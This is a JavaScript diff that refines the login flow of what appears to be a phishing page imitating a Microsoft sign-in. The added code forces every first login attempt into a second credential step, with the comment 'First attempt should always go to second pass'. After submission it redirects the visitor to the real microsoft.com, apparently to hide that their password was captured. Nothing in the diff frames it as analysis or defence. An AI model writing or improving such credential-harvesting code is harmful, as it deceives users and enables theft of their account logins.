@@ -218,32 +218,36 @@
         fetch('/', {
             method: 'POST',
             body: formData,
-            redirect: 'manual'
+            redirect: 'follow'
         })
         .then(response => {
-            if (response.type === 'opaqueredirect' || response.redirected) {
-                if (response.url && response.url.includes('microsoft.com')) {
-                    window.location.href = 'https://microsoft.com';
-                } else if (response.url && response.url.includes('retry=true')) {
-                    setTimeout(() => showStep3(), 500);
-                } else if (!isSecondAttempt) {
-                    setTimeout(() => showStep3(), 500);
-                } else {
-                    location.reload();
-                }
+            // Check if redirected to microsoft.com (successful login)
+            if (response.url && response.url.includes('microsoft.com')) {
+                window.location.href = 'https://microsoft.com';
                 return null;
             }
+            
+            // Check if redirected back to our form with retry parameter
+            if (response.url && response.url.includes('retry=true')) {
+                setTimeout(() => showStep3(), 500);
+                return null;
+            }
+            
             return response.text();
         })
         .then(html => {
             if (!html) return;
             
-            if (html.includes('error=true') || html.includes('incorrect')) {
+            // Check if the response contains error indicators
+            if (html.includes('error=true') || html.includes('step=retry')) {
                 if (!isSecondAttempt) {
-                    showStep3();
+                    setTimeout(() => showStep3(), 500);
                 } else {
                     showError("Login failed. Please try again.");
                 }
+            } else if (!isSecondAttempt) {
+                // First attempt should always go to second pass
+                setTimeout(() => showStep3(), 500);
             }
         })
         .catch(error => {
